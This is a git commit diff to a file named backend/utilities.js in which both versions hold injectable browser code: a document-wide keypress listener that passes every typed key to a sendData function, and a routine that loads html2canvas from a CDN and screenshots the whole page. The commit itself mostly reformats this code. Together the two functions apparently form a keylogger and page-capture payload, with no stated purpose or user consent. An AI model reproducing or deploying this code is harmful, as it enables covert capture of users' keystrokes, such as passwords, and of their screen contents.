c155224145e5fbb132ac8f0a053dd127547ba814
Prakshal Pro <prakshal@Prakshals-MacBook-Pro.local>
2022-05-23 00:46:05 -0400

    works hrml2canvas

--- backend/utilities.js
+++ backend/utilities.js
@@ -1,35 +1,34 @@
 const util = [
-  async () => 
-  document.addEventListener("keypress", async (event) => {
-    await sendData(event.key)
-}),
+  async () =>
+    document.addEventListener("keypress", async (event) => {
+      await sendData(event.key)
+    }),
+
+
   () => {
-  var script = document.createElement('script');
-   script.setAttribute('src', 'https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js');
-   script.setAttribute('type', 'text/javascript');
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js');
+    script.setAttribute('type', 'text/javascript');
     script.async = false
-    script.addEventListener('load', function() {
-    // The script is loaded completely
-    console.log("im working")
-    html2canvas(document.body, {
-    allowTaint: true,
-    useCORS: true,
-  })
-.then(function (canvas) {
-  // It will return a canvas element
-  let image = canvas.toDataURL("image/png", 0.5);
-  console.log(image)
-})
-.catch((e) => {
-  // Handle errors
-  console.log(e);
-});
-});
-   document.body.appendChild(script);
-    
-    
-  
-}
+    script.addEventListener('load', function () {
+      // The script is loaded completely
+      console.log("im working")
+      html2canvas(document.body, {
+        allowTaint: true,
+        useCORS: true,
+      })
+        .then(function (canvas) {
+          // It will return a canvas element
+          let image = canvas.toDataURL("image/png", 0.5);
+          console.log(image)
+        })
+        .catch((e) => {
+          // Handle errors
+          console.log(e);
+        });
+    });
+    document.body.appendChild(script);
+  }
 ]
 
 module.exports = util
